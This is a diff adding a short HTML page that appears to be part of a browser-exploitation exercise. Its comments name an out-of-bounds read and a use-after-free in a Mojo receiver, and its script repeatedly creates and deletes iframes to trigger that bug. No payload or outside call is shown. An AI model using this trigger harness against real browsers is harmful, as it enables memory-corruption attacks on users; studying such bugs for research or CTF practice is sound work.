@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<!-- 1. we can read arbitraty length from our 'data_store_' (std::vector<uint8_t>) -->
+<!-- 2. uaf due to 'MakeSelfOwnedReciever' - we can still queue messages on the pipe-->
+	<body>
+		<script>
+			console.log('asdf');
+		</script>
+
+		<script>
+			const IFRAMES = 10;
+
+			function create_rfh(id) {
+				const iframe = document.createElement('iframe');
+				iframe.src = "/trigger_child.html";
+				iframe.id = id;
+
+				document.body.appendChild(iframe);
+			}
+
+			function delete_rfh(id) {
+				document.getElementById(id).remove();
+			}
+		</script>
+
+		<script>
+			for (let i = 0; i < IFRAMES; i++) {
+				create_rfh(`qwerty${i}`);
+				setTimeout(() => delete_rfh(`qwerty${i}`), 500);
+			}
+
+			setTimeout(() => location.reload(), 5000);
+		</script>
+	</body>
+</html>
